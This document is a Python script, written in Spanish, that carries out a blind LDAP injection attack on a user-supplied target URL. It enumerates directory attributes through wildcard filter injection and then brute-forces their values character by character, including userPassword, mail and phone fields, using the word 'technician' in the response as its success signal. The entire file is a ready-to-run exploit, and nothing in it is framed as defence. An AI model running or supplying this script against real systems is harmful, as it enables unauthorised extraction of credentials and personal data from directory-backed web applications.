#!/usr/bin/python3
import sys
import requests
import string
from termcolor import colored


OBJETIVO_URL = input(colored("Ingresa la URL objetivo (ejemplo: http://target.com/users/list.php?name=*) : ", 'cyan'))


CARACTERES_ESPECIALES = "_@{}-/()!*\"$%=^[]:;"
CONJUNTO_CARACTERES = string.ascii_letters + string.digits + CARACTERES_ESPECIALES

# Función para enumerar atributos
def obtener_atributos():
    print(colored("\nEjemplo de prueba: " + OBJETIVO_URL + "(test)\n", 'yellow'))
    print(colored("\nIniciando exploración de atributos:\n", 'blue'))
    atributos_identificados = []
    for atributo in LISTA_ATRIBUTOS:
        respuesta = requests.get(OBJETIVO_URL + str(atributo) + "=*")
        sys.stdout.write(colored("Probando: ", 'red') + OBJETIVO_URL + str(atributo) + f"\r")
        if 'technician' in respuesta.text:
            atributos_identificados.append(str(atributo))
    print(colored("\nAtributos detectados:\n", 'green'))
    print(atributos_identificados)
    return atributos_identificados

# Función para encontrar atributos vulnerables
def detectar_atributos_vulnerables(atributos):
    atributos_explotables = []
    for atributo in atributos:
        for caracter in CONJUNTO_CARACTERES:
            respuesta = requests.get(OBJETIVO_URL + str(atributo) + "=" + str(caracter) + "*")
            sys.stdout.write(colored("Verificando: ", 'red') + OBJETIVO_URL + str(atributo) + "=" + str(caracter) + f"\r")
            if 'technician' in respuesta.text:
                atributos_explotables.append(str(atributo))
                break
    print(colored("\nAtributos vulnerables detectados:\n", 'green'))
    print(atributos_explotables)
    return atributos_explotables

# Función para realizar fuerza bruta
def ejecutar_fuerza_bruta(atributos):
    print(colored("Iniciando ataque de fuerza bruta...\n", 'blue'))
    datos_extraidos = {}
    for atributo in atributos:
        url_actual = OBJETIVO_URL + atributo + '='
        dato = ""
        while True:
            caracter_encontrado = False
            for caracter in CONJUNTO_CARACTERES:
                prueba = url_actual + str(caracter)
                respuesta = requests.get(prueba + "*")
                sys.stdout.write(colored("Probando: ", 'red') + prueba + f"\r")
                if 'technician' in respuesta.text:
                    url_actual = prueba
                    dato += caracter
                    caracter_encontrado = True
                    break
            if not caracter_encontrado:
                print(colored("\nIntentando bypass con wildcard...\n", 'yellow'))
                for caracter in CONJUNTO_CARACTERES:
                    prueba = url_actual + "*" + str(caracter)
                    respuesta = requests.get(prueba + "*")
                    sys.stdout.write(colored("Bypass: ", 'red') + prueba + f"\r")
                    if 'technician' in respuesta.text:
                        url_actual = prueba
                        dato += caracter
                        caracter_encontrado = True
                        break
            if not caracter_encontrado:
                print(colored("\nNo se encontraron más caracteres para: ", 'yellow'), atributo)
                break
        print(colored("\nDato recuperado para atributo:", 'green'), atributo + ':', url_actual)
        datos_extraidos[atributo] = url_actual
    return datos_extraidos


def ejecutar():
    atributos_obtenidos = obtener_atributos()
    atributos_explotables = detectar_atributos_vulnerables(atributos_obtenidos)
    datos_finales = ejecutar_fuerza_bruta(atributos_explotables)
    return datos_finales

if __name__ == "__main__":
    # Lista de atributos de LDAP
    LISTA_ATRIBUTOS = (
        'accessHint', 'accountHint', 'audio', 'businessCategory', 'c', 'carLicense', 'cn', 'configPtr', 'departmentNumber',
        'description', 'destinationIndicator', 'displayName', 'employeeNumber', 'employeeType', 'facsimileTelephoneNumber',
        'generationQualifier', 'givenName', 'homeFax', 'homePhone', 'initials', 'internationalISDNNumber', 'jpegPhoto', 'l',
        'labeledURI', 'mail', 'manager', 'middleName', 'mobile', 'o', 'objectClass', 'organizationalStatus', 'otherMailbox',
        'ou', 'pager', 'personalTitle', 'photo', 'physicalDeliveryOfficeName', 'postalAddress', 'postalCode', 'postOfficeBox',
        'preferredDeliveryMethod', 'preferredLanguage', 'registeredAddress', 'roomNumber', 'secretary', 'seeAlso', 'sn', 'st',
        'street', 'telephoneNumber', 'teletexTerminalIdentifier', 'telexNumber', 'thumbNailLogo', 'thumbNailPhoto', 'title',
        'uid', 'uniqueIdentifier', 'userCertificate', 'userPKCS12', 'userPassword', 'userSMIMECertificate', 'x121Address', 'x500UniqueIdentifier'
    )
    resultados = ejecutar()
    print(colored("\nDatos extraídos:\n", 'blue'))
    for atributo, valor in resultados.items():
        print(colored(atributo + ':', 'yellow'), valor)
